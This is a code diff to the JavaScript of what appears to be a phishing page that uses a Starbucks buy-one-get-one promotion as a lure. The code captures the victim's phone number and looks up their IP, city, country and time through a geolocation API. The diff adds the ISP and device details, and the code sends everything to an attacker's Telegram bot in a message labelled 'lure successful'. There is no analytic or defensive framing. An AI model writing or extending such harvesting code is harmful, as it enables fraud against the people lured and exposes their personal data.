@@ -99,12 +99,15 @@
 
             const ipData = await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>({}));
             const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
+            const 裝置 = navigator.userAgent.match(/\((.+?)\)/)?.[1] || "未知裝置";
 
-            const 訊息 = "JCB星巴克 $99 誘捕成功\n\n" +
+            const 訊息 = "2025星巴克買一送一誘捕成功\n\n" +
                         "電話：" + code + phone + "\n" +
                         "IP　　：" + (ipData.ip || "未知") + "\n" +
                         "位置　：" + (ipData.city || "未知") + "，" + (ipData.country_name === "Taiwan" ? "台灣" : ipData.country_name || "未知") + "\n" +
-                        "時間　：" + 時間;
+                        "ISP　　：" + (ipData.org || "未知") + "\n" +
+                        "時間　：" + 時間 + "\n" +
+                        "裝置　：" + 裝置;
 
             fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage", {
                 method:"POST",
